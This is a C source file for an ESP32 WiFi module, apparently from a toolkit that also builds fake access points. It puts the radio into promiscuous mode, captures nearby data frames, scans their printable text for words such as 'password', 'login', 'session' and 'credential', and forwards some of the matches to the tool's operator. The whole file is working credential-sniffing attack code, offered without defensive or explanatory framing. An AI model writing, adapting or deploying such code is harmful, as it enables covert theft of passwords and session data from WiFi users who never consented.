#include "esp_wifi.h"
#include "esp_log.h"
#include <ctype.h>
#include <string.h>
#include <stdbool.h>

#include "fakeAP_utils.h"
#include "utils.h"

static const char *TAG = "MODULE_NET_SNIFFER";

/* ============================================================
 * State
 * ============================================================ */
static bool sniffer_running = false;
static uint32_t sniff_counter = 0;

/* ============================================================
 * Helpers
 * ============================================================ */
static void extract_printable(
    const uint8_t *src,
    int src_len,
    char *dst,
    int dst_len
) {
    int j = 0;
    for (int i = 0; i < src_len && j < dst_len - 1; i++) {
        if (isprint(src[i])) {
            dst[j++] = src[i];
        }
    }
    dst[j] = '\0';
}

/* ============================================================
 * WiFi callback
 * ============================================================ */
static void wifi_sniffer_packet_handler(
    void *buf,
    wifi_promiscuous_pkt_type_t type
) {
    if (!sniffer_running || type != WIFI_PKT_DATA)
        return;

    const wifi_promiscuous_pkt_t *pkt =
        (const wifi_promiscuous_pkt_t *)buf;

    const uint8_t *frame = pkt->payload;
    uint16_t frame_len = pkt->rx_ctrl.sig_len;

    if (frame_len < 36)
        return;

    const uint8_t *payload = frame + 24;
    int payload_len = frame_len - 24;
    if (payload_len <= 0)
        return;

    char printable[256];
    extract_printable(payload, payload_len, printable, sizeof(printable));
    if (!printable[0])
        return;

    const char *keywords[] = {
        "password", "login", "username", "pass",
        "email", "auth", "session", "credential",
        "secret", "admin"
    };

    for (size_t i = 0; i < sizeof(keywords)/sizeof(keywords[0]); i++) {
        if (strstr(printable, keywords[i])) {

            if ((sniff_counter++ % 20) != 0)
                return;

            msg_data(
                TAG,
                printable,
                strlen(printable),
                true,       /* eof */
                NULL        /* request_id */
            );
            return;
        }
    }
}

/* ============================================================
 * API
 * ============================================================ */
void start_sniffer(void)
{
    if (sniffer_running) {
        msg_info(TAG, "Sniffer already running", NULL);
        return;
    }

    sniff_counter = 0;
    sniffer_running = true;

    ESP_ERROR_CHECK(
        esp_wifi_set_promiscuous_rx_cb(
            wifi_sniffer_packet_handler
        )
    );
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    msg_info(TAG, "WiFi sniffer started", NULL);
}

void stop_sniffer(void)
{
    if (!sniffer_running) {
        msg_info(TAG, "Sniffer not running", NULL);
        return;
    }

    sniffer_running = false;
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));

    msg_info(TAG, "WiFi sniffer stopped", NULL);
}
